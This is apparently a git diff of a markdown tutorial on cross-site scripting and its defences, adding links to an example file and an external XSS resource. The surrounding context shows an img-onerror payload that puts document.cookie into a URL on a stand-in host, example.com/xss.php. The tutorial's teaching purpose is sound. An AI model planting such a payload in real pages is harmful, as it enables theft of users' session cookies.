@@ -41,6 +41,8 @@ This code shows how a missing image can be used with an HTML attribute to trigge
 <img src="http://nofile" onerror="adr='http://example.com/xss.php?'+ encodeURIComponent(document.cookie)">
 ```
 
+Example fount in example found in **[Externals/xss.html](../Externals/xss.html)**
+
 ## Defending aginst Cross-Site Scripting attack
 
 ![defending_xss](./defending_xss.png)
@@ -100,3 +102,5 @@ When you add untrusted content to an HTML page, once it has been escaped on the 
 > :information_source: [jQuery](https://jquery.com/) is a fast, small, and feature-rich JavaScript library. It makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers.
 
 > :information_source: [ASCII](https://www.cs.cmu.edu/~pattis/15-1XX/common/handouts/ascii.html) stands for American Standard Code for Information Interchange.
+
+> :information_source: Learn more about [XSS](https://excess-xss.com/)
